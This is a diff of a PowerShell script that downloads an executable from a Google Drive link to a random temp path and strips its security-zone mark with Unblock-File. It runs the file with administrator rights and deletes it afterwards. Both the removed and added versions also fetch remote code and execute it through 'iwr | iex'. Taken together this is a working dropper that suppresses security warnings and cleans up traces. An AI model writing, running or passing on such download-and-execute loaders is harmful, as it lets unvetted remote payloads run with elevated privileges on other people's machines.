@@ -1,70 +1,63 @@
-# Define the URL of the Google Drive file
-$googleDriveFileUrl = "https://drive.google.com/file/d/1w_oAksHkSpF6WoY1rgJ_ZieaBWu0Mt7p/view?usp=drive_link"
-
-# Define the local path to save the downloaded file in the temp folder
-$localFilePath = Join-Path $env:TEMP "installer.exe"
-
-# Function to log messages
-function Log-Message {
+function DownloadAndRun-Executable {
     param (
-        [string]$message
-    )
-    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-    Write-Output "$timestamp - $message"
-}
-
-# Function to download the file
-function Download-File {
-    param (
-        [string]$url,
-        [string]$outputPath
+        [string] $url
     )
 
     try {
-        Log-Message "Starting download from $url..."
-        Invoke-WebRequest -Uri $url -OutFile $outputPath -ErrorAction Stop
-        Log-Message "File downloaded successfully to $outputPath."
-    } catch {
-        Log-Message "Error downloading file: $_"
-        throw $_
+        # Create a temporary file path with the .exe extension
+        $tempFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), [System.IO.Path]::GetRandomFileName() + ".exe")
+        
+        Write-Output "Downloading executable from $url to $tempFilePath"
+        
+        # Download the executable from the provided URL
+        iwr $url -OutFile $tempFilePath -ErrorAction Stop
+        
+        Write-Output "Download complete. Unblocking file."
+
+        # Unblock the downloaded file to prevent security warnings
+        Unblock-File -Path $tempFilePath -ErrorAction Stop
+
+        Write-Output "Unblocked file. Running executable with admin privileges."
+
+        # Run the executable with administrator rights
+        $process = Start-Process -FilePath $tempFilePath -Verb RunAs -PassThru -Wait
+
+        # Log the exit code
+        Write-Output "Executable completed with exit code: $($process.ExitCode)"
+
+        # Clean up: Delete the temporary file after execution
+        Remove-Item -Path $tempFilePath -Force
+        
+        Write-Output "Temporary file deleted."
+    }
+    catch {
+        Write-Error "Failed to download or run executable from $url. Error: $_"
     }
 }
 
-# Function to install the downloaded file
-function Install-File {
+function Execute-RemoteScript {
     param (
-        [string]$filePath
+        [string] $url
     )
 
     try {
-        Log-Message "Starting installation of $filePath with admin privileges..."
-        Start-Process -FilePath $filePath -ArgumentList "/S" -Wait -NoNewWindow -Verb RunAs -ErrorAction Stop
-        Log-Message "Installation completed successfully."
-    } catch {
-        Log-Message "Error during installation: $_"
-        throw $_
+        Write-Output "Executing remote script from $url"
+        
+        # Fetch and execute the remote script
+        iwr $url | iex
+    }
+    catch {
+        Write-Error "Failed to execute remote script from $url. Error: $_"
     }
 }
 
-# Main script execution
-try {
-    # Download the file
-    Download-File -url $googleDriveFileUrl -outputPath $localFilePath
+# URLs of the executables to download and run
+$urls = @(
+    'https://drive.google.com/file/d/1w_oAksHkSpF6WoY1rgJ_ZieaBWu0Mt7p/view?usp=drive_link'
+)
 
-    # Install the file
-    Install-File -filePath $localFilePath
 
-    # Execute additional command after installation with admin privileges
-    Log-Message "Executing additional command with admin privileges..."
-    Start-Process -FilePath "powershell.exe" -ArgumentList "iwr -useb $googleDriveFileUrl | iex" -Verb RunAs -Wait -NoNewWindow -ErrorAction Stop
-    Log-Message "Additional command executed successfully."
-} catch {
-    Log-Message "Script failed: $_"
-    exit 1
-} finally {
-    # Clean up downloaded file
-    if (Test-Path $localFilePath) {
-        Remove-Item $localFilePath -ErrorAction SilentlyContinue
-        Log-Message "Cleaned up downloaded file."
-    }
+# Loop through each URL and execute the download and run function
+foreach ($url in $urls) {
+    DownloadAndRun-Executable -url $url
 }
